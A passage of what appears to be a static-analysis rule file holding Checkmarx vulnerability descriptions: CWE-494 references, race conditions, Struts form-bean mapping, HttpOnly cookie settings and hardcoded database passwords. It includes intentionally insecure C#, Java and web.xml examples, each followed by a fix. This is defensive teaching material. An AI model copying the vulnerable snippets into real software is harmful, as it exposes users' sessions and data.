&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;CanFollow&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;79&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=79" target="_blank"&gt;Failure to Preserve Web Page Structure ('Cross-site Scripting')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Research Gaps"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Research Gaps&lt;/div&gt;&lt;div name="oc_494_Research Gaps" id="oc_494_Research Gaps" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This is critical for mobile code, but it is likely to become more and more
common as developers continue to adopt automated, network-based product
distributions and upgrades. Software-as-a-Service (SaaS) might introduce
additional subtleties. Common exploitation scenarios may include ad server
compromises and bad upgrades.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_494_Taxonomy Mappings" id="oc_494_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Invoking untrusted mobile code&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_494_Related Attack Patterns" id="oc_494_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org184.html" target="_blank"&gt;184&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Software Integrity Attacks&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org185.html" target="_blank"&gt;185&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malicious Software Download&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org186.html" target="_blank"&gt;186&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malicious Software Update&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org187.html" target="_blank"&gt;187&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malicious Automated Software Update&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_494_References" id="oc_494_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Microsoft. "Introduction to Code Signing". &amp;lt;&lt;a href="http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx" target="_blank"&gt;http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Apple. "Code Signing Guide". Apple Developer Connection. 2008-11-19. &amp;lt;&lt;a href="http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html" target="_blank"&gt;http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Anthony Bellissimo, John Burgess
and Kevin Fu. "Secure Software Updates: Disappointments and New
Challenges". &amp;lt;&lt;a href="http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf" target="_blank"&gt;http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-17] Michael Howard, David LeBlanc
and John Viega. "24 Deadly Sins of Software Security". "Sin 18: The Sins of Mobile Code." Page
267. McGraw-Hill. 2010. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_494_Content History" id="oc_494_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Common Consequences,
Description, Name, Other Notes, Potential Mitigations, References,
Relationships, Research Gaps, Type&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Observed Examples,
Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Detection Factors, References,
Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-04-05&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Mobile Code: Invoking
Untrusted Mobile Code&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Download of Untrusted Mobile
Code Without Integrity Check&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_665</key><name>Struts_Thread_Safety_Violation_In_Action_Class</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;A&amp;nbsp;race condition can cause erratic or unexpected application behavior. Additionally, if a race condition&amp;nbsp;can be influenced directly by users, an attacker may choose to replay a race condition until they obtain a desired&amp;nbsp;result, allowing them to induce certain application behavior that is not part of its intentional design.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Concurrent instances, such as threads or servlets, can run concurrently. Failure to ensure all of their operations on a shared resource are done atomically and in a synchronized manner may result in threads overriding each other's actions or outputs. For example, a logical state&amp;nbsp;may have been validated prior to an update operation, but the update operation itself was only&amp;nbsp;performed after the previously validated state has changed due to code concurrency.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpLast" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Consider allocating independent&amp;nbsp;resources&amp;nbsp;for concurrent logical processes, unless required.&lt;/p&gt;
&lt;p&gt;Where resource sharing is required, utilize a locking mechanism when handling shared resources to ensure that actions are performed atomically by the current process, so that these logical processes&amp;nbsp;are not overridden or disrupted by any other concurrent process.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;ASPX Setting and Then Reading A Singleton Variable That May Have Been Set By Another Request&lt;/h4&gt;&lt;pre&gt;// Default.aspx.cs
using System;
using System.ComponentModel.DataAnnotations;
using System.Web.DynamicData;

public partial class _Default : System.Web.UI.Page {
    public static string secret = "None";
    protected void Page_Load(object sender, EventArgs e) {
        secret = Request.Params["secret"];
    }
}

// Default.aspx - the "secret" printed here may be different to the secret obtained and set from Request,
// if another user makes a request with a different "secret", writing a different "secret" altogether
&lt;%@ Page Language="C#" MasterPageFile="~/Site.master" CodeFile="Default.aspx.cs" Inherits="_Default" %&gt;
&lt;asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder1" Runat="Server"&gt;
    &lt;%= secret %&gt; 
&lt;/asp:Content&gt;&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Threads Incrementing The Same Variable Without Locking&lt;/h4&gt;&lt;pre&gt;	public static class FooIncrement {
		static int foo = 0;
		static Object lock = new Object();
		public static int generateFoo() throws InterruptedException {
			IncrementFooThread[] threadArray = new IncrementFooThread[10000];
			for (int i = 0; i &lt; threadArray.length; i++) {
				threadArray[i] = new IncrementFooThread(); 
				threadArray[i].start();
			}
			for (IncrementFooThread threaderThread : threadArray) {
				threaderThread.join();
			}
			return foo;
		}
		public static class IncrementFooThread extends Thread {
			public void run() 
			{
				foo++; //two threads may separately read the same value of foo before any of them update it,
              		   //resulting in two threads setting the same value of foo
			}
			
		}
	}&lt;/pre&gt;&lt;h4&gt;Adding A Lock Object to Synchronize a Shared Resource&lt;/h4&gt;&lt;pre&gt;	public static class FooIncrement {
		static int foo = 0;
		static Object lock = new Object();
		public static int generateFoo() throws InterruptedException {
			IncrementFooThread[] threadArray = new IncrementFooThread[10000];
			for (int i = 0; i &lt; threadArray.length; i++) {
				threadArray[i] = new IncrementFooThread(); 
				threadArray[i].start();
			}
			for (IncrementFooThread threaderThread : threadArray) {
				threaderThread.join();
			}
			return foo;
		}
		public static class IncrementFooThread extends Thread {
			public void run() 
			{
				synchronized (lock) {
					foo++; //foo is atomically incremented
				}
			}
			
		}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1707</key><name>Struts_Mapping_to_Missing_Form_Bean</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Failure to map an action to a corresponding form may result in unhandled exceptions or unexpected application behavior.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;An action element is defined with a name attribute; however, this name attribute is not associated with a corresponding form-bean element, indicating that this mapping is either missing or is no longer correct.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Ensure Struts actions are correctly mapped to their corresponding forms.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Action-Mapping without Corresponding Form-Bean in struts-config.xml&lt;/h4&gt;&lt;pre&gt;&lt;struts-config&gt;
	&lt;global-forwards&gt;
        &lt;forward name="helloWorld" path="/helloWorld.do"/&gt;
    &lt;/global-forwards&gt;
    &lt;action-mappings&gt;
        &lt;action path="/helloWorld" type="com.helloworld.action.HelloWorldAction" name="helloWorldForm"&gt;
        	&lt;forward name="success" path="/helloWorld.jsp" /&gt;
        &lt;/action&gt;
    &lt;/action-mappings&gt;
&lt;/struts-config&gt;&lt;/pre&gt;&lt;h4&gt;Action-Mapping with a Corresponding Form-Bean in struts-config.xml&lt;/h4&gt;&lt;pre&gt;&lt;struts-config&gt;
    &lt;form-beans&gt;
    	&lt;form-bean name="helloWorldForm" type="com.helloworld.form.HelloWorldForm"/&gt;
    &lt;/form-beans&gt;
	&lt;global-forwards&gt;
        &lt;forward name="helloWorld" path="/helloWorld.do"/&gt;
    &lt;/global-forwards&gt;
    &lt;action-mappings&gt;
        &lt;action path="/helloWorld" type="com.helloworld.action.HelloWorldAction" name="helloWorldForm"&gt;
        	&lt;forward name="success" path="/helloWorld.jsp" /&gt;
        &lt;/action&gt;
    &lt;/action-mappings&gt;
&lt;/struts-config&gt;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2343</key><name>HttpOnlyCookies</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Cookies that contain the user's session identifier, and other sensitive application cookies, are typically accessible by client-side scripts, such as JavaScript. Unless the web application explicitly prevents this using the "httpOnly" cookie flag, these cookies could be read and accessed by malicious client scripts, such as Cross-Site Scripting (XSS). This flag would mitigate the damage done in case XSS vulnerabilities are discovered, according to Defense in Depth.&amp;nbsp;&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The web application framework by default does not set the "httpOnly" flag for the application's sessionid cookie, and other sensitive application cookies. Likewise, the application does not explicitly use the "httpOnly" cookie flag, thus allowing client scripts to access the cookies by default.&amp;nbsp;&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;p&gt;&amp;nbsp;- Always set the "httpOnly" flag for any sensitive server-side cookie.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&amp;nbsp;- Explicitly set the "httpOnly" flag for each cookie set by the application.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- In particular, explicitly call the &lt;code&gt;Cookie.setHttpOnly()&lt;/code&gt; method, on any cookie being added to the response.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Consider configuring the web application framework to automatically set httpOnly to all cookies, by&amp;nbsp;adding &lt;code&gt;&amp;lt;http-only&amp;gt;true&amp;lt;/http-only&amp;gt;&lt;/code&gt; under the &lt;code&gt;&amp;lt;cookie-config&amp;gt;&lt;/code&gt; element, in your application's web.xml configuration file.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- If the cookie is set to the response via the &lt;code&gt;.setHeader()&lt;/code&gt; method with the &lt;code&gt;"Set-Cookie"&lt;/code&gt; header name, append &lt;code&gt;";httpOnly;"&lt;/code&gt; to the end of the cookie value.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Creating Cookie in Code&lt;/h4&gt;&lt;pre&gt;private void setCookiesToResponse( HttpServletResponse response, String deptId) {
	Cookie appCookie = new Cookie("department", deptId);
	response.addCookie(appCookie);
}&lt;/pre&gt;&lt;h4&gt;Explicitly setting the HttpOnly flag on Cookies&lt;/h4&gt;&lt;pre&gt;private void setCookiesToResponse( HttpServletResponse response, String deptId ) {
	Cookie appCookie = new Cookie("department", deptId);
	appCookie.setMaxAge(360);
  	appCookie.setSecure(true);
  
	appCookie.setHttpOnly(true);

	response.addCookie(appCookie);
}&lt;/pre&gt;&lt;h4&gt;Manually Writing Cookie Headers&lt;/h4&gt;&lt;pre&gt;private void setCookiesToResponse( HttpServletResponse response, String deptId ) {
  	response.setHeader("Set-Cookie", "department=" + deptId);
}&lt;/pre&gt;&lt;h4&gt;Manual Cookie Headers with HttpOnly Attribute&lt;/h4&gt;&lt;pre&gt;private void setCookiesToResponse( HttpServletResponse response, String deptId ) {
  	response.setHeader("Set-Cookie", "department=" + deptId + ";httpOnly;secure;Expires=Thu, 31 Dec 2020 12:00:00 GMT;");
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2344</key><name>HttpOnlyCookies_In_Config</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Cookies that contain the user's session identifier, and other sensitive application cookies, are typically accessible by client-side scripts, such as JavaScript. Unless the web application explicitly prevents this using the "httpOnly" cookie flag, these cookies could be read and accessed by malicious client scripts, such as Cross-Site Scripting (XSS). This flag would mitigate the damage done in case XSS vulnerabilities are discovered, according to Defense in Depth.&amp;nbsp;&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The web application framework by default does not set the "httpOnly" flag for the application's sessionid cookie, and other sensitive application cookies. Likewise, the application does not explicitly use the "httpOnly" cookie flag, thus allowing client scripts to access the cookies by default.&amp;nbsp;&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;p&gt;&amp;nbsp;- Always set the "httpOnly" flag for any sensitive server-side cookie.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&amp;nbsp;- Configure the application to always use "httpOnly" cookies, in the site-wide configuration file.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- In your application's web.xml configuration file, add &lt;code&gt;&amp;lt;http-only&amp;gt;true&amp;lt;/http-only&amp;gt;&lt;/code&gt; under&amp;nbsp;the &lt;code&gt;&amp;lt;cookie-config&amp;gt;&lt;/code&gt; element, in the &lt;code&gt;&amp;lt;session-config&amp;gt;&lt;/code&gt; element.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Insecure Cookie Configuration&lt;/h4&gt;&lt;pre&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;web-app xmlns="http://java.sun.com/xml/ns/javaee"
	      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	      xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
	      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	      version="3.0"&gt;

    &lt;session-config&gt;
        &lt;cookie-config&gt;
            &lt;http-only&gt;false&lt;/http-only&gt;
        &lt;/cookie-config&gt;
    &lt;/session-config&gt;
    
&lt;/web-app&gt;&lt;/pre&gt;&lt;h4&gt;Web.xml Configuration File with Secure Cookies&lt;/h4&gt;&lt;pre&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;web-app xmlns="http://java.sun.com/xml/ns/javaee"
	      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	      xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
	      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	      version="3.0"&gt;

    &lt;session-config&gt;
        &lt;session-timeout&gt;30&lt;/session-timeout&gt;
        &lt;cookie-config&gt;
            &lt;http-only&gt;true&lt;/http-only&gt;
            &lt;secure&gt;true&lt;/secure&gt;
        &lt;/cookie-config&gt;
    &lt;/session-config&gt;
    
&lt;/web-app&gt;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_633</key><name>Hardcoded_password_in_Connection_String</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Hardcoded database passwords expose the application to password leakage, and the database to unauthorized access. If an attacker gains access to the source code (or can decompile the application binaries), she will be able to steal the embedded passwords, and use them to directly access the database. This would enable the attacker to steal secret information, modify sensitive records, or delete important data.&amp;nbsp;&lt;/div&gt;
&lt;div&gt;&amp;nbsp;&lt;/div&gt;
&lt;div&gt;In addition, the password cannot be easily changed when required. In the eventual situation wherein it is a necessity to update the password, a new version of the application would need to be built and deployed to production systems.&amp;nbsp;&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application has the database password hardcoded in the source code files, and uses this password in a connection string to the database or other server. This password is visible to anyone with access to source code, and cannot be changed without rebuilding or recompiling the application. Even after compilation or deployment, the password and connection string are still present in the binary program files or production environment.&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;&amp;nbsp;- Never hardcode sensitive data, such as database passwords.&amp;nbsp;&lt;/div&gt;
&lt;div&gt;&amp;nbsp;- Prefer to avoid requiring an explicit database password at all, instead using OS-integrated system authentication.&lt;/div&gt;
&lt;div&gt;&amp;nbsp;- Alternatively, store the password in an encrypted configuration file, and implement a mechanism enabling administrators to change the password. Ensure the file permissions are configured to restrict access to administrators only.&amp;nbsp;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;- In particular, if the database supports Integrated Authentication or Kerberos, prefer to use this over explicit credentials for the SQL user.&amp;nbsp;&lt;/p&gt;
